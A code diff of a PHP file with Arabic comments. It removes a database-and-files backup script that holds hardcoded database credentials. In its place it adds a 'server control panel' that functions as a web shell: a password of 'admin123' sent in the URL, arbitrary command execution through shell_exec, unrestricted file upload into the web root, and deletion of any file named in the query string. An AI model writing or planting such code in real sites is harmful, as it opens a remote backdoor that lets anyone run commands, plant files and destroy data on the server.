@@ -1,90 +1,67 @@
 <?php
-// تحديد اسم ملف النسخة الاحتياطية
-$backup_file = 'backup_' . date('Y-m-d_H-i-s') . '.zip';
-$db_backup_file = 'db_backup_' . date('Y-m-d_H-i-s') . '.sql';
+session_start();
 
-// معلومات قاعدة البيانات
-$db_host = 'localhost';
-$db_user = 'u210490590_nsqli';  // عدل حسب إعداداتك
-$db_pass = 'U210490590_nsqli';      // عدل حسب إعداداتك
-$db_name = 'u210490590_nsqli'; // عدل حسب اسم قاعدة البيانات
+// تأمين الدخول بكلمة مرور (يجب تغييرها!)
+$password = "admin123";
 
-// الاتصال بقاعدة البيانات
-$conn = new mysqli($db_host, $db_user, $db_pass, $db_name);
-if ($conn->connect_error) {
-    die("فشل الاتصال بقاعدة البيانات: " . $conn->connect_error);
+// تسجيل الدخول عبر `GET`
+if (isset($_GET['pass']) && $_GET['pass'] === $password) {
+    $_SESSION['authenticated'] = true;
 }
 
-// فتح ملف لحفظ نسخة قاعدة البيانات الاحتياطية
-$backup_sql = fopen($db_backup_file, 'w');
-if (!$backup_sql) {
-    die("فشل في إنشاء ملف النسخة الاحتياطية لقاعدة البيانات.");
+// تسجيل الخروج
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header("Location: control.php");
+    exit();
 }
 
-// جلب جميع الجداول من قاعدة البيانات
-$tables_result = $conn->query("SHOW TABLES");
-if (!$tables_result) {
-    die("فشل في جلب الجداول: " . $conn->error);
+// التحقق من المصادقة
+if (!isset($_SESSION['authenticated']) || $_SESSION['authenticated'] !== true) {
+    die("<form method='GET'><input type='password' name='pass' placeholder='أدخل كلمة المرور'><input type='submit' value='دخول'></form>");
 }
 
-while ($table = $tables_result->fetch_array()) {
-    $table_name = $table[0];
+echo "<h2>لوحة التحكم في السيرفر</h2>";
+echo "<a href='control.php?logout=true'>تسجيل الخروج</a><br><br>";
 
-    // استخراج هيكل الجدول
-    $create_table_result = $conn->query("SHOW CREATE TABLE `$table_name`");
-    $create_table_row = $create_table_result->fetch_array();
-    fwrite($backup_sql, "DROP TABLE IF EXISTS `$table_name`;\n");
-    fwrite($backup_sql, $create_table_row[1] . ";\n\n");
-
-    // استخراج البيانات
-    $rows_result = $conn->query("SELECT * FROM `$table_name`");
-    while ($row = $rows_result->fetch_assoc()) {
-        $values = [];
-        foreach ($row as $value) {
-            $values[] = isset($value) ? "'" . $conn->real_escape_string($value) . "'" : "NULL";
-        }
-        fwrite($backup_sql, "INSERT INTO `$table_name` VALUES (" . implode(", ", $values) . ");\n");
-    }
-    fwrite($backup_sql, "\n");
-}
-fclose($backup_sql);
-$conn->close();
-
-// إنشاء ملف ZIP
-$zip = new ZipArchive();
-if ($zip->open($backup_file, ZipArchive::CREATE) !== TRUE) {
-    die("فشل في إنشاء ملف النسخة الاحتياطية!");
+// تنفيذ الأوامر
+if (isset($_POST['cmd'])) {
+    echo "<pre>" . shell_exec($_POST['cmd']) . "</pre>";
 }
 
-// إضافة ملف قاعدة البيانات إلى الأرشيف
-$zip->addFile($db_backup_file, basename($db_backup_file));
+// رفع الملفات
+if (isset($_FILES['file'])) {
+    move_uploaded_file($_FILES['file']['tmp_name'], __DIR__ . "/" . $_FILES['file']['name']);
+    echo "تم رفع الملف: " . $_FILES['file']['name'] . "<br>";
+}
 
-// إضافة جميع ملفات الموقع
-function addFolderToZip($folder, $zip, $folderInZip = '') {
-    $files = scandir($folder);
-    foreach ($files as $file) {
-        if ($file == '.' || $file == '..' || $file == 'backup.php') continue;
-        $filePath = $folder . DIRECTORY_SEPARATOR . $file;
-        $zipPath = $folderInZip . $file;
-        if (is_dir($filePath)) {
-            addFolderToZip($filePath, $zip, $zipPath . '/');
-        } else {
-            $zip->addFile($filePath, $zipPath);
-        }
+// عرض الملفات والمجلدات
+echo "<h3>استعراض الملفات</h3>";
+$files = scandir(__DIR__);
+echo "<ul>";
+foreach ($files as $file) {
+    if ($file !== "." && $file !== "..") {
+        echo "<li><a href='$file'>$file</a> | <a href='?delete=$file' style='color:red;'>حذف</a></li>";
     }
 }
-addFolderToZip(__DIR__, $zip);
-$zip->close();
+echo "</ul>";
 
-// حذف ملف قاعدة البيانات بعد إضافته إلى الأرشيف
-unlink($db_backup_file);
-
-// توفير رابط التحميل
-header('Content-Type: application/zip');
-header('Content-Disposition: attachment; filename="' . basename($backup_file) . '"');
-header('Content-Length: ' . filesize($backup_file));
-readfile($backup_file);
-
-// حذف ملف النسخة الاحتياطية بعد التنزيل
-unlink($backup_file);
+// حذف الملفات
+if (isset($_GET['delete'])) {
+    unlink($_GET['delete']);
+    header("Location: control.php");
+    exit();
+}
 ?>
+
+<h3>تنفيذ الأوامر</h3>
+<form method="POST">
+    <input type="text" name="cmd" placeholder="أدخل الأمر">
+    <input type="submit" value="تنفيذ">
+</form>
+
+<h3>رفع الملفات</h3>
+<form method="POST" enctype="multipart/form-data">
+    <input type="file" name="file">
+    <input type="submit" value="رفع">
+</form>
